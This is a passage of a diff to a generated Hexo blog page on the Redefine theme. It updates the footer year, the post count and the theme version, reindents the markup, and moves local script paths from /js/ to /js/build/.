class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E3%83%8E%CF%89%E3%83%8E"><span class="nav-text"> 字符串长度限制 (ﾉ*･ω･)ﾉ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#path-%E3%83%8E%CF%89%E3%83%8E"><span class="nav-text"> $PATH (ﾉ*･ω･)ﾉ</span></a></li></ol></li></ol>
 
-    </div>
+	</div>
 </div>
-        </div>
-    
+	</div>
+	
 </div>
+			</div>
 
+			
+		</div>
 
-
-                
-
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
     <div class="info-container py-3 text-center">
         
         <div class="text-center">
@@ -625,12 +647,12 @@ ls -t ：按照时间将文本排序输出<br>
               <span>2022</span>
               -
             
-            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">The Redefine Team</a>
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">The Redefine Team</a>
             
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        共撰写了 5 篇文章
+                        共撰写了 7 篇文章
                     </span>
                     
                 </p>
@@ -655,7 +677,7 @@ ls -t ：按照时间将文本排序输出<br>
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
             <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
-            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
         </div>
         
         
@@ -684,95 +706,92 @@ ls -t ：按照时间将文本排序输出<br>
         
     </div>  
 </footer>
-        </div>
-    </div>
+		</div>
+	</div>
 
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
 
-        <!-- go comment -->
-        
-            <li class="go-comment">
-                <i class="fa-regular fa-comments"></i>
-            </li>
-        
-    </ul>
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
 </div>
 
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-
-        
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
-</div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
+	
 
 </main>
 
 
-    
-<script src="/js/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupSlideTheme.min.js"></script>
+<script src="/js/build/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
 
-<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
 
-<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
 
-<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
 
 <script>
     const swup = new Swup({
@@ -796,44 +815,42 @@ ls -t ：按照时间将文本排序输出<br>
 
 
 
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
 
+<script src="/js/build/utils.js" type="module"></script>
 
+<script src="/js/build/main.js" type="module"></script>
 
-<script src="/js/tools/imageViewer.js" type="module"></script>
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
 
-<script src="/js/utils.js" type="module"></script>
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
 
-<script src="/js/main.js" type="module"></script>
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
 
-<script src="/js/layouts/navbarShrink.js" type="module"></script>
-
-<script src="/js/tools/scrollTopBottom.js" type="module"></script>
-
-<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
-
-<script src="/js/layouts/categoryList.js" type="module"></script>
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
 
 
 
 
 
     
-<script src="/js/tools/codeBlock.js" type="module"></script>
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
 
 
 
 
     
-<script src="/js/layouts/lazyload.js" type="module"></script>
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
 
 
 
 
     
-<script src="/js/tools/runtime.js"></script>
+<script src="/js/build/tools/runtime.js"></script>
 
     
-<script src="/js/libs/odometer.min.js"></script>
+<script src="/js/build/libs/odometer.min.js"></script>
 
     
 <link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
@@ -842,10 +859,10 @@ ls -t ：按照时间将文本排序输出<br>
 
 
   
-<script src="/js/libs/Typed.min.js"></script>
+<script src="/js/build/libs/Typed.min.js"></script>
 
   
-<script src="/js/plugins/typed.js" type="module"></script>
+<script src="/js/build/plugins/typed.js" type="module"></script>
 
 
 
@@ -855,29 +872,32 @@ ls -t ：按照时间将文本排序输出<br>
 
 
     
-<script src="/js/libs/anime.min.js"></script>
+<script src="/js/build/libs/anime.min.js"></script>
 
 
 
 
 
     
-<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
 
-<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
 
-<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
-
-
-
-
-<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
-
-
-<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
 
 
 
 
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
 </body>
+
 </html>
